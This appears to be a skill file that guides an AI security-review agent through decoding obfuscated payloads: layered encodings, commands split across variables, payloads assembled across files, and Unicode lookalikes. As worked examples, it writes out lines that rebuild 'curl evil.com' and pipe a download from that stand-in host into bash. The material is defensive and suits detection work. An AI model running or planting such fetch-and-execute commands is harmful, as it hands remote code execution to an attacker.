---
name: obfuscation_evasion_analysis
description: "Guidance for decoding hidden payloads in skills"
version: 1.0.0
author: ClawSecbot
tags: [scenario, obfuscation, encoding]
---

# Obfuscation and Evasion Analysis

## When This Skill Is Needed

Load this skill when you discover encoded, obfuscated, or encrypted content in the target skill — such as base64 strings, hex escape sequences, Unicode tricks, or commands split across multiple variables. Obfuscation serves one primary purpose: to hide intent from reviewers.

**Key insight**: Legitimate code rarely needs obfuscation. When obfuscation is present, assume the author is hiding something until you prove otherwise.

## How to Judge Risk

When analyzing obfuscated content, your goal is to decode and reveal the true intent.

### 1. Why is encoding being used?

Ask yourself: does this encoding serve a legitimate purpose?
- Base64 for binary data handling? Reasonable.
- Base64 for shell commands that get executed? Suspicious.
- Hex escapes for special characters in strings? Maybe reasonable.
- Hex escapes building up command names like `curl`? Malicious.

The question is not "is this encoded?" but "why would they encode this?"

### 2. Decode recursively until you reach plain text

Attackers chain encodings to evade detection:
- Base64 → gzip → another Base64 → actual payload
- A single decode may reveal another encoded layer

When you find encoded content:
1. Decode the first layer
2. Check if the result looks like another encoding (base64 pattern, gzip header, hex strings)
3. If yes, decode again
4. Repeat until you reach plain text or decoding fails
5. Analyze the final plain text content

**CRITICAL**: Never stop at one layer. Triple-layer obfuscation is common in real attacks.

### 3. Reconstruct commands from variable substitution

Attackers split dangerous commands across variables:
```
a="cu"; b="rl"; c=" evil.com"; $a$b$c  →  curl evil.com
```

To analyze:
1. Find all variable assignments in the file
2. Trace how variables are used and concatenated
3. Reconstruct the final string at execution points
4. Analyze the complete reconstructed command

Look for: single-character variable names, chr() functions building strings, array joins.

### 4. Check for cross-file payload assembly

Payloads may be split across multiple files:
- file1.sh exports `CMD_PART1="curl evil.com"`
- file2.sh sources file1.sh and adds `CMD_PART2=" | bash"`
- main.sh sources file2.sh and runs `eval "$CMD_PART1$CMD_PART2"`

Each file looks innocent alone. You must trace the data flow across all files.

### 5. Detect Unicode tricks

Visual deception through similar-looking characters:
- Cyrillic 'а' (U+0430) looks like Latin 'a' but is different
- `curl` might actually be `сurl` (Cyrillic 'c') which doesn't execute
- Or malicious code might use lookalikes to bypass filters

Check for:
- Mixed scripts in identifiers (Latin + Cyrillic)
- Right-to-left override characters hiding file extensions
- Zero-width characters that alter meaning invisibly

### 6. Analyze what the decoded content actually does

After decoding, apply the same analysis as plain code:
- Does it make network requests? → potential data exfiltration
- Does it execute shell commands? → check what commands
- Does it access sensitive files? → check which files
- Is there yet another encoding layer? → decode again

## Key Risk Signals

**CRITICAL — Immediate concern:**
- Decoded content reveals shell command execution
- Multiple layers of encoding (double/triple obfuscation)
- Decoded payload contains reverse shells or backdoors
- Obfuscation hides credential theft

**HIGH — Requires investigation:**
- Any command execution after decoding
- Variable chains reconstruct dangerous commands
- Base64 strings in shell scripts
- Packed/minified code with eval()

**MEDIUM — Needs context:**
- Simple encoding for data transmission
- Legitimate minification
- Single-layer encoding with clear purpose

## Cross-skill Coordination

- If decoded content reveals data transmission → load **data_exfiltration_analysis**
- If decoded content is executable script → load **script_execution_analysis**
- If obfuscation is in package install hooks → load **dependency_supply_chain_analysis**
